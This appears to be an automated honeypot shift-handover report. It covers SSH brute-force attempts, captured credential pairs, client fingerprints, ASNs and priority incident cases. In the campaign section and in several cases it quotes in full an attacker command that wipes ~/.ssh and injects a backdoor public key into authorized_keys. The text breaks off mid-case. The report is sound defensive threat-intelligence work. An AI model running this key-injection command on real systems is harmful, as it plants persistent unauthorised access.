# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-08 |
| **Generated At** | 2026-05-08T19:24:46Z |
| **Shift Time** | 19:24 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **175** |
| Confirmed Threats | **139** |
| False Positives Filtered | **36** (20.6%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **13** |
| High Severity Cases | **18** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **157** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **106** |
| Unique Credential Pairs | **70** |
| Unique Usernames | **34** |
| Unique Passwords | **65** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 18 |
| `ubuntu` | 13 |
| `admin` | 12 |
| `user` | 9 |
| `345gs5662d34` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 9 |
| `345gs5662d34` | 8 |
| `1q2w3e4r` | 3 |
| `test` | 3 |
| `123123` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 9 |
| `345gs5662d34` | `345gs5662d34` | 8 |
| `admin` | `Password123x` | 2 |
| `admin` | `!Q@W#E` | 2 |
| `user` | `2wsx` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `gitgit` | `217.154.38.181` | 2026-05-08T17:32:37 |
| `root` | `3245gs5662d34` | `217.154.38.181` | 2026-05-08T17:32:41 |
| `root` | `admin4321` | `43.135.135.17` | 2026-05-08T17:43:30 |
| `root` | `3245gs5662d34` | `43.135.135.17` | 2026-05-08T17:43:36 |
| `root` | `gitgit` | `43.135.135.17` | 2026-05-08T17:45:14 |
| `root` | `admin4321` | `217.154.38.181` | 2026-05-08T17:49:38 |
| `root` | `test@456` | `43.135.135.17` | 2026-05-08T17:49:50 |
| `root` | `Xl@123456` | `158.178.141.16` | 2026-05-08T17:52:23 |
| `root` | `3245gs5662d34` | `158.178.141.16` | 2026-05-08T17:52:27 |
| `root` | `Root@1234` | `94.29.124.154` | 2026-05-08T17:54:48 |
| `root` | `3245gs5662d34` | `94.29.124.154` | 2026-05-08T17:54:55 |
| `root` | `server2024` | `180.184.38.93` | 2026-05-08T18:24:39 |
| `root` | `3245gs5662d34` | `180.184.38.93` | 2026-05-08T18:24:48 |
| `root` | `ispadmin` | `27.50.25.190` | 2026-05-08T18:31:27 |
| `root` | `3245gs5662d34` | `27.50.25.190` | 2026-05-08T18:31:29 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **175** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 134 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 74 | 5 |
| `03a80b21afa8...` | Modern SSH client | 53 | 5 |
| `f555226df196...` | Mirai/variant | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 74 | 5 | libssh-based |
| `03a80b21afa8...` | libssh | 53 | 5 | Modern SSH client |
| `f555226df196...` | libssh | 4 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 3 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `94.29.124.154`, `27.50.25.190`, `180.184.38.93`, `43.135.135.17`, `217.154.38.181`, `158.178.141.16`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **22** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS6181` | Cincinnati Bell Telephone Company LLC | 1 | MEDIUM |
| `AS137693` | CHINATELECOM Guangxi Nanning IDC network | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS131111` | PT Mora Telematika Indonesia | 1 | HIGH |
| `AS36926` | Airtel Networks Kenya Limited | 1 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (18)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-030751f63c68

| Field | Detail |
|---|---|
| **Source IP** | `217.154.38[.]181` |
| **First Seen** | 2026-05-08 17:32 |
| **Last Seen** | 2026-05-08 17:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 17:32:36` | `cowrie.session.connect` |
| `2026-05-08 17:32:36` | `cowrie.client.version` |
| `2026-05-08 17:32:36` | `cowrie.client.kex` |
| `2026-05-08 17:32:37` | `cowrie.login.success` |
| `2026-05-08 17:32:37` | `cowrie.session.params` |
| `2026-05-08 17:32:37` | `cowrie.command.input` |
| `2026-05-08 17:32:37` | `cowrie.command.failed` |
| `2026-05-08 17:32:38` | `cowrie.log.closed` |
| `2026-05-08 17:32:38` | `cowrie.session.params` |
| `2026-05-08 17:32:38` | `cowrie.command.input` |
| `2026-05-08 17:32:38` | `cowrie.session.file_download` |
| `2026-05-08 17:32:38` | `cowrie.log.closed` |
| `2026-05-08 17:32:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `217.154.38[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ff62e3af9f0

| Field | Detail |
|---|---|
| **Source IP** | `217.154.38[.]181` |
| **First Seen** | 2026-05-08 17:32 |
| **Last Seen** | 2026-05-08 17:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 17:32:40` | `cowrie.session.connect` |
| `2026-05-08 17:32:40` | `cowrie.client.version` |
| `2026-05-08 17:32:40` | `cowrie.client.kex` |
| `2026-05-08 17:32:41` | `cowrie.login.success` |
| `2026-05-08 17:32:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `217.154.38[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d85a60888d84

| Field | Detail |
|---|---|
| **Source IP** | `43.135.135[.]17` |
| **First Seen** | 2026-05-08 17:43 |
| **Last Seen** | 2026-05-08 17:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 17:43:29` | `cowrie.session.connect` |
| `2026-05-08 17:43:29` | `cowrie.client.version` |
| `2026-05-08 17:43:29` | `cowrie.client.kex` |
| `2026-05-08 17:43:30` | `cowrie.login.success` |
| `2026-05-08 17:43:31` | `cowrie.session.params` |
| `2026-05-08 17:43:31` | `cowrie.command.input` |
| `2026-05-08 17:43:31` | `cowrie.command.failed` |
| `2026-05-08 17:43:31` | `cowrie.log.closed` |
| `2026-05-08 17:43:31` | `cowrie.session.params` |
| `2026-05-08 17:43:31` | `cowrie.command.input` |
| `2026-05-08 17:43:32` | `cowrie.session.file_download` |
| `2026-05-08 17:43:32` | `cowrie.log.closed` |
| `2026-05-08 17:43:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.135.135[.]17` to AbuseIPDB if not already reported
- [ ] Block `43.135.135[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-214c1f679d2e

| Field | Detail |
|---|---|
| **Source IP** | `43.135.135[.]17` |
| **First Seen** | 2026-05-08 17:43 |
| **Last Seen** | 2026-05-08 17:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 17:43:35` | `cowrie.session.connect` |
| `2026-05-08 17:43:35` | `cowrie.client.version` |
| `2026-05-08 17:43:35` | `cowrie.client.kex` |
| `2026-05-08 17:43:36` | `cowrie.login.success` |
| `2026-05-08 17:43:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.135.135[.]17` to AbuseIPDB if not already reported
- [ ] Block `43.135.135[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7719e5b68388

| Field | Detail |
|---|---|
| **Source IP** | `43.135.135[.]17` |
| **First Seen** | 2026-05-08 17:45 |
| **Last Seen** | 2026-05-08 17:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 17:45:13` | `cowrie.session.connect` |
| `2026-05-08 17:45:13` | `cowrie.client.version` |
| `2026-05-08 17:45:13` | `cowrie.client.kex` |
| `2026-05-08 17:45:14` | `cowrie.login.success` |
| `2026-05-08 17:45:15` | `cowrie.session.params` |
| `2026-05-08 17:45:15` | `cowrie.command.input` |
| `2026-05-08 17:45:15` | `cowrie.command.failed` |
| `2026-05-08 17:45:15` | `cowrie.log.closed` |
| `2026-05-08 17:45:16` | `cowrie.session.params` |
| `2026-05-08 17:45:16` | `cowrie.command.input` |
| `2026-05-08 17:45:16` | `cowrie.session.file_download` |
| `2026-05-08 17:45:16` | `cowrie.log.closed` |
| `2026-05-08 17:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.135.135[.]17` to AbuseIPDB if not already reported
- [ ] Block `43.135.135[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-437ce23cc0fa

| Field | Detail |
|---|---|
| **Source IP** | `43.135.135[.]17` |
| **First Seen** | 2026-05-08 17:45 |
| **Last Seen** | 2026-05-08 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 17:45:19` | `cowrie.session.connect` |
| `2026-05-08 17:45:19` | `cowrie.client.version` |
| `2026-05-08 17:45:19` | `cowrie.client.kex` |
| `2026-05-08 17:45:20` | `cowrie.login.success` |
| `2026-05-08 17:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.135.135[.]17` to AbuseIPDB if not already reported
- [ ] Block `43.135.135[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b631792e072c

| Field | Detail |
|---|---|
| **Source IP** | `217.154.38[.]181` |
| **First Seen** | 2026-05-08 17:49 |
| **Last Seen** | 2026-05-08 17:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 17:49:37` | `cowrie.session.connect` |
| `2026-05-08 17:49:37` | `cowrie.client.version` |
| `2026-05-08 17:49:37` | `cowrie.client.kex` |
| `2026-05-08 17:49:38` | `cowrie.login.success` |
| `2026-05-08 17:49:38` | `cowrie.session.params` |
| `2026-05-08 17:49:38` | `cowrie.command.input` |
| `2026-05-08 17:49:38` | `cowrie.command.failed` |
| `2026-05-08 17:49:38` | `cowrie.log.closed` |
| `2026-05-08 17:49:39` | `cowrie.session.params` |
| `2026-05-08 17:49:39` | `cowrie.command.input` |
| `2026-05-08 17:49:39` | `cowrie.session.file_download` |
| `2026-05-08 17:49:39` | `cowrie.log.closed` |
| `2026-05-08 17:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `217.154.38[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1960497d8283

| Field | Detail |
|---|---|
| **Source IP** | `217.154.38[.]181` |
| **First Seen** | 2026-05-08 17:49 |
| **Last Seen** | 2026-05-08 17:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 17:49:41` | `cowrie.session.connect` |
| `2026-05-08 17:49:41` | `cowrie.client.version` |
| `2026-05-08 17:49:41` | `cowrie.client.kex` |
| `2026-05-08 17:49:42` | `cowrie.login.success` |
| `2026-05-08 17:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `217.154.38[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ecd85d6c1ec

| Field | Detail |
|---|---|
| **Source IP** | `43.135.135[.]17` |
| **First Seen** | 2026-05-08 17:49 |
| **Last Seen** | 2026-05-08 17:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 17:49:48` | `cowrie.session.connect` |
| `2026-05-08 17:49:48` | `cowrie.client.version` |
| `2026-05-08 17:49:49` | `cowrie.client.kex` |
| `2026-05-08 17:49:50` | `cowrie.login.success` |
| `2026-05-08 17:49:50` | `cowrie.session.params` |
| `2026-05-08 17:49:50` | `cowrie.command.input` |
| `2026-05-08 17:49:50` | `cowrie.command.failed` |
| `2026-05-08 17:49:51` | `cowrie.log.closed` |
| `2026-05-08 17:49:51` | `cowrie.session.params` |
| `2026-05-08 17:49:51` | `cowrie.command.input` |
| `2026-05-08 17:49:51` | `cowrie.session.file_download` |
| `2026-05-08 17:49:51` | `cowrie.log.closed` |
| `2026-05-08 17:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.135.135[.]17` to AbuseIPDB if not already reported
- [ ] Block `43.135.135[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ec3574d2591

| Field | Detail |
|---|---|
| **Source IP** | `43.135.135[.]17` |
| **First Seen** | 2026-05-08 17:49 |
| **Last Seen** | 2026-05-08 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 17:49:54` | `cowrie.session.connect` |
| `2026-05-08 17:49:54` | `cowrie.client.version` |
| `2026-05-08 17:49:55` | `cowrie.client.kex` |
| `2026-05-08 17:49:56` | `cowrie.login.success` |
| `2026-05-08 17:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.135.135[.]17` to AbuseIPDB if not already reported
- [ ] Block `43.135.135[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53927426bd17

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]16` |
| **First Seen** | 2026-05-08 17:52 |
| **Last Seen** | 2026-05-08 17:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 17:52:22` | `cowrie.session.connect` |
| `2026-05-08 17:52:22` | `cowrie.client.version` |
| `2026-05-08 17:52:22` | `cowrie.client.kex` |
| `2026-05-08 17:52:23` | `cowrie.login.success` |
| `2026-05-08 17:52:23` | `cowrie.session.params` |
| `2026-05-08 17:52:23` | `cowrie.command.input` |
| `2026-05-08 17:52:23` | `cowrie.command.failed` |
| `2026-05-08 17:52:24` | `cowrie.log.closed` |
| `2026-05-08 17:52:24` | `cowrie.session.params` |
| `2026-05-08 17:52:24` | `cowrie.command.input` |
| `2026-05-08 17:52:24` | `cowrie.session.file_download` |
| `2026-05-08 17:52:24` | `cowrie.log.closed` |
| `2026-05-08 17:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]16` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abc570580be2

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]16` |
| **First Seen** | 2026-05-08 17:52 |
| **Last Seen** | 2026-05-08 17:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 17:52:26` | `cowrie.session.connect` |
| `2026-05-08 17:52:26` | `cowrie.client.version` |
| `2026-05-08 17:52:27` | `cowrie.client.kex` |
| `2026-05-08 17:52:27` | `cowrie.login.success` |
| `2026-05-08 17:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]16` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbf496f3fce0

| Field | Detail |
|---|---|
| **Source IP** | `94.29.124[.]154` |
| **First Seen** | 2026-05-08 17:54 |
| **Last Seen** | 2026-05-08 17:54 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 17:54:45` | `cowrie.session.connect` |
| `2026-05-08 17:54:45` | `cowrie.client.version` |
| `2026-05-08 17:54:46` | `cowrie.client.kex` |
| `2026-05-08 17:54:48` | `cowrie.login.success` |
| `2026-05-08 17:54:49` | `cowrie.session.params` |
| `2026-05-08 17:54:49` | `cowrie.command.input` |
| `2026-05-08 17:54:49` | `cowrie.command.failed` |
| `2026-05-08 17:54:49` | `cowrie.log.closed` |
| `2026-05-08 17:54:50` | `cowrie.session.params` |
| `2026-05-08 17:54:50` | `cowrie.command.input` |
| `2026-05-08 17:54:50` | `cowrie.session.file_download` |
| `2026-05-08 17:54:50` | `cowrie.log.closed` |
| `2026-05-08 17:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
